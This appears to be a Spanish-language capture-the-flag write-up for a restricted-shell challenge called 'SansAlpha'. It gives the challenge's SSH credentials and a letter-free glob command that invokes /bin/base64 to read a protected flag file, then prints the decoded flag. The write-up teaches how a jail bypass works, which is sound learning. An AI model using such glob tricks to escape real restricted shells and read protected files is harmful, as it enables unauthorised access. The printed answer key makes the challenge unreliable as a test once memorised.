### Descripción
The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols. `ssh -p 36202 ctf-player@chatelaine.cylabacademy.net`

Use password: `13792798`

Hint: Where can you get some letters?
### Solución

1. Iniciamos conectándonos a la instancia del servidor mediante SSH con las credenciales proporcionadas:
```
~/cylab via 🐍 v3.13.5 took 55s 
➜ ssh -p 36202 ctf-player@chatelaine.cylabacademy.net
```

2. Una vez dentro del entorno restringido (`SansAlpha$`), exploramos la estructura de los archivos utilizando el comodín de asterisco (`*`). Al ejecutar `*/*`, el sistema nos arroja un error de permisos, pero este mismo error nos revela valiosa información: existe un subdirectorio llamado `blargh` y dentro de él un archivo llamado `flag.txt`.
```
SansAlpha$ */*
bash: blargh/flag.txt: Permission denied
```

3. Como no podemos escribir el comando `cat` o `base64` con letras para leer el archivo, utilizamos patrones de búsqueda o _globbing_. Ingresamos el comando `/*/???[!_]64` para obligar a bash a buscar en la raíz un binario de tres letras, ignorando el guion bajo, y que termine en "64" (lo que evalúa como `/bin/base64`). Le pasamos como argumento la ruta del archivo utilizando la misma técnica con el patrón `*/????.*` (que se traduce como `blargh/flag.txt`):
```
SansAlpha$ /*/???[!_]64 */????.*     
cmV0dXJuIDAgYWNhZGVteXs3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV9iZDQ5ZWUzZn0=
```

4. Tras obtener la respuesta, salimos de la conexión SSH escribiendo `exit`. De vuelta en nuestra máquina local, decodificamos la cadena obtenida en base64 para revelar la bandera en texto claro:
```
~/cylab via 🐍 v3.13.5 took 4m41s 
➜ echo cmV0dXJuIDAgYWNhZGVteXs3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV9iZDQ5ZWUzZn0= | base64 -d
return 0 academy{7h15_mu171v3r53_15_m4dn355_bd49ee3f}
```

**Flag**: academy{7h15_mu171v3r53_15_m4dn355_bd49ee3f}
### Notas Adicionales

Este reto demuestra una vulnerabilidad común en las cárceles de bash mal configuradas: la expansión de rutas o **Globbing**. En sistemas Unix, los comodines como `*` (que representa cero o más caracteres), `?` (que representa exactamente un carácter) y `[!_]` (que representa una exclusión lógica) son evaluados y traducidos a rutas reales por la terminal _antes_ de la ejecución del comando. Esto permite construir rutas completas de binarios (como `/bin/base64`) y archivos objetivo sin necesidad de utilizar una sola letra del alfabeto en el input.
### Referencias

